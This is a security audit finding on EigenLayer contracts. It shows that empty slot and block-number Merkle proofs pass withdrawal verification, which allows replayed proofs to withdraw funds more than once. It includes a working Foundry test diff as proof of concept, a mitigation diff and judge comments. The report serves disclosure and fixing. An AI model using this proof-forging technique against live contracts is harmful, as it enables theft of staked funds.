[H-01] Slot and block number proofs not required for verification of withdrawal (multiple withdrawals possible)
Submitted by0xTheC0der, also found bywindowhan001andvolodya
Since this is a vulnerability that involves multiple in-scope contracts and leads to more than one impact, let’s start with a bug description from bottom to top.
LibraryMerkle
The methodsverifyInclusionSha256(proof, root, leaf, index)andverifyInclusionKeccak(proof, root, leaf, index)willalwaysreturntrueifproof.length < 32(e.g. empty proof)andleaf == root. Although this might be intended behaviour, I see no use case for empty proofs and wouldrequirenon-empty proofs at the library level. As of now, the user of the library isresponsibleto enforce non-zero proofs.
LibraryBeaconChainProofs
The methodverifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields), which relies on multiple calls toMerkle.verifyInclusionSha256(proof, root, leaf, index), does notrequirea minimum length ofproofs.slotProofandproofs.blockNumberProof. As a consequence, considering a valid set of(beaconStateRoot, proofs, withdrawalFields), the method will still succeed withemptyslot and block number proofs, i.e. theproofscan be modified in the following way:
proofs.slotProof=bytes("");// empty slot proofproofs.slotRoot=proofs.blockHeaderRoot;// make leaf == rootproofs.blockNumberProof=bytes("");// empty block number proofproofs.blockNumberRoot=proofs.executionPayloadRoot;// make leaf == root
As a consequence, we can take a perfectly valid withdrawal proof and re-create the proof for the same withdrawal with adifferentslot and block number (according to the code above) that will still be accepted by theverifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)method.
ContractEigenPod
The methodverifyAndProcessWithdrawal(withdrawalProofs, …), which relies on a call toBeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields), is impacted by a modified - but still valid - withdrawal proof in two ways.
First, the modifierproofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))makes sure that theblock numberbeing proven is greater/newer than themostRecentWithdrawalBlockNumber. In our case,blockNumberRoot = executionPayloadRootand depending on the actual value ofexecutionPayloadRoot, theproofIsForValidBlockNumbercan be bypassed as shown in the test, see any PoC test case. As a consequence, old withdrawal proofs could be re-used with an emptyblockNumberProofto withdraw the same funds more than once.
Second, the sub-method_processPartialWithdrawal(withdrawalHappenedSlot, …)requires that aslotis only used once. In our case,slotRoot = blockHeaderRootleads to adifferent slotthan suggested by the original proof. Therefore, a withdrawal proof can be re-used with an emptyslotProofto do the same partial withdrawal twice, see PoC. Depending on the actual value ofblockHeaderRoot, a full withdrawal, instead of a partial withdrawal, will be done according to thecondition in L354.
Insufficient validation of proofs allows multiple withdrawals, i.e. theft of funds.
Proof of Concept
The changes to theEigenPodtest cases below demonstrate the following outcomes:testFullWithdrawalProof:BeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields)still succeeds on empty slot and block number proofs.testFullWithdrawalFlow:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows full withdrawal with empty slot and block number proofs.testPartialWithdrawalFlow:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows partial withdrawal with empty slot and block number proofs.testProvingMultipleWithdrawalsForSameSlot:EigenPod.verifyAndProcessWithdrawal(withdrawalProofs, …)allows partial withdrawal of the same funds twice due to differentslotRootin original and modified proof.
TheproofIsForValidBlockNumber(Endian.fromLittleEndianUint64(withdrawalProofs.blockNumberRoot))modifier is bypassed (seeblockNumberRoot) in the latter three of the above test cases.
Apply the followingdiffto yoursrc/test/EigenPod.t.soland run the tests withforge test --match-contract EigenPod:
diff --git a/src/test/EigenPod.t.sol b/src/test/EigenPod.t.solindex 31e6a58..5242def 100644--- a/src/test/EigenPod.t.sol+++ b/src/test/EigenPod.t.sol@@ -260,7 +260,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {function testFullWithdrawalProof() public {setJSON("./src/test/test-data/fullWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory proofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -281,7 +281,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {// ./solidityProofGen "WithdrawalFieldsProof" 61336 2262 "data/slot_43222/oracle_capella_beacon_state_43300.ssz" "data/slot_43222/capella_block_header_43222.json" "data/slot_43222/capella_block_43222.json" fullWithdrawalProof.jsonsetJSON("./src/test/test-data/fullWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -317,7 +317,7 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {//generate partialWithdrawalProofs.json with:// ./solidityProofGen "WithdrawalFieldsProof" 61068 656 "data/slot_58000/oracle_capella_beacon_state_58100.ssz" "data/slot_58000/capella_block_header_58000.json" "data/slot_58000/capella_block_58000.json" "partialWithdrawalProof.json"setJSON("./src/test/test-data/partialWithdrawalProof.json");-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(SKIP_SLOT_BLOCK_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();@@ -346,21 +346,22 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {/// @notice verifies that multiple partial withdrawals can be made before a full withdrawalfunction testProvingMultipleWithdrawalsForSameSlot(/*uint256 numPartialWithdrawals*/) public {-        IEigenPod newPod = testPartialWithdrawalFlow();+        IEigenPod newPod = testPartialWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();-        cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));+        // do not expect revert anymore due to different 'slotRoot' on FULL_PROOF and SKIP_SLOT_BLOCK_PROOF+        //cheats.expectRevert(bytes("EigenPod._processPartialWithdrawal: partial withdrawal has already been proven for this slot"));newPod.verifyAndProcessWithdrawal(withdrawalProofs, validatorFieldsProof, validatorFields, withdrawalFields, 0, 0);}/// @notice verifies that multiple full withdrawals for a single validator failfunction testDoubleFullWithdrawal() public {-        IEigenPod newPod = testFullWithdrawalFlow();-        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof();+        IEigenPod newPod = testFullWithdrawalFlow(); // uses SKIP_SLOT_BLOCK_PROOF+        BeaconChainProofs.WithdrawalProofs memory withdrawalProofs = _getWithdrawalProof(FULL_PROOF);bytes memory validatorFieldsProof = abi.encodePacked(getValidatorProof());withdrawalFields = getWithdrawalFields();validatorFields = getValidatorFields();@@ -759,8 +760,11 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {return proofs;}+    uint256 internal constant FULL_PROOF = 0;+    uint256 internal constant SKIP_SLOT_BLOCK_PROOF = 1;+/// @notice this function just generates a valid proof so that we can test other functionalities of the withdrawal flow-    function _getWithdrawalProof() internal returns(BeaconChainProofs.WithdrawalProofs memory) {+    function _getWithdrawalProof(uint256 proofType) internal returns(BeaconChainProofs.WithdrawalProofs memory) {//make initial depositcheats.startPrank(podOwner);eigenPodManager.stake{value: stakeAmount}(pubkey, signature, depositDataRoot);@@ -773,9 +777,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {beaconChainOracle.setBeaconChainStateRoot(beaconStateRoot);bytes32 blockHeaderRoot = getBlockHeaderRoot();bytes32 blockBodyRoot = getBlockBodyRoot();-            bytes32 slotRoot = getSlotRoot();-            bytes32 blockNumberRoot = getBlockNumberRoot();+            bytes32 slotRoot = (proofType == FULL_PROOF) ? getSlotRoot() : blockHeaderRoot; // else SKIP_SLOT_BLOCK_PROOFbytes32 executionPayloadRoot = getExecutionPayloadRoot();+            bytes32 blockNumberRoot = (proofType == FULL_PROOF) ? getBlockNumberRoot() :  executionPayloadRoot; // else SKIP_SLOT_BLOCK_PROOF@@ -786,9 +790,9 @@ contract EigenPodTests is ProofParsing, EigenPodPausingConstants {BeaconChainProofs.WithdrawalProofs memory proofs = BeaconChainProofs.WithdrawalProofs(abi.encodePacked(getBlockHeaderProof()),abi.encodePacked(getWithdrawalProof()),-                abi.encodePacked(getSlotProof()),+                (proofType == FULL_PROOF) ? abi.encodePacked(getSlotProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOFabi.encodePacked(getExecutionPayloadProof()),-                abi.encodePacked(getBlockNumberProof()),+                (proofType == FULL_PROOF) ? abi.encodePacked(getBlockNumberProof()) : bytes(""), // else SKIP_SLOT_BLOCK_PROOFuint64(blockHeaderRootIndex),uint64(withdrawalIndex),blockHeaderRoot,
We can see thatallthe test cases are still passing, whereby the following ones are confirming the aforementioned outcomes:
[PASS] testFullWithdrawalFlow():(address) (gas: 28517915)[PASS] testFullWithdrawalProof() (gas: 13185538)[PASS] testPartialWithdrawalFlow():(address) (gas: 28679149)[PASS] testProvingMultipleWithdrawalsForSameSlot() (gas: 45502286)
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Require a minimum length (tree height) for the slot and block number proofs inBeaconChainProofs.verifyWithdrawalProofs(beaconStateRoot, proofs, withdrawalFields).
At least require non-empty proofs according to the followingdiff:
diff --git a/src/contracts/libraries/BeaconChainProofs.sol b/src/contracts/libraries/BeaconChainProofs.solindex b4129bf..119baf2 100644--- a/src/contracts/libraries/BeaconChainProofs.sol+++ b/src/contracts/libraries/BeaconChainProofs.sol@@ -259,6 +259,10 @@ library BeaconChainProofs {"BeaconChainProofs.verifyWithdrawalProofs: withdrawalProof has incorrect length");require(proofs.executionPayloadProof.length == 32 * (BEACON_BLOCK_HEADER_FIELD_TREE_HEIGHT + BEACON_BLOCK_BODY_FIELD_TREE_HEIGHT),"BeaconChainProofs.verifyWithdrawalProofs: executionPayloadProof has incorrect length");+        require(proofs.slotProof.length >= 32,+            "BeaconChainProofs.verifyWithdrawalProofs: slotProof has incorrect length");+        require(proofs.blockNumberProof.length >= 32,+            "BeaconChainProofs.verifyWithdrawalProofs: blockNumberProof has incorrect length");/*** Computes the block_header_index relative to the beaconStateRoot.  It concatenates the indexes of all the
Alternative: Non-empty proofs can also be required in theMerklelibrary.
Assessed type
Invalid Validation
sorrynotsorry (lookout) commented:
Well demonstrated with referrable code snippets, hyperlinks, and coded POC.
Marking as HQ.
Sidu28 (EigenLayer) confirmed
Alex the Entreprenerd (judge) commented:
The Warden has shown how, due to a lack of length check, an empty proof could be provided; which would pass validation.This is an example of how a lack of a check can be chained into a proper exploit, and because the proof will pass, funds can be stolen.For these reasons I agree with High Severity.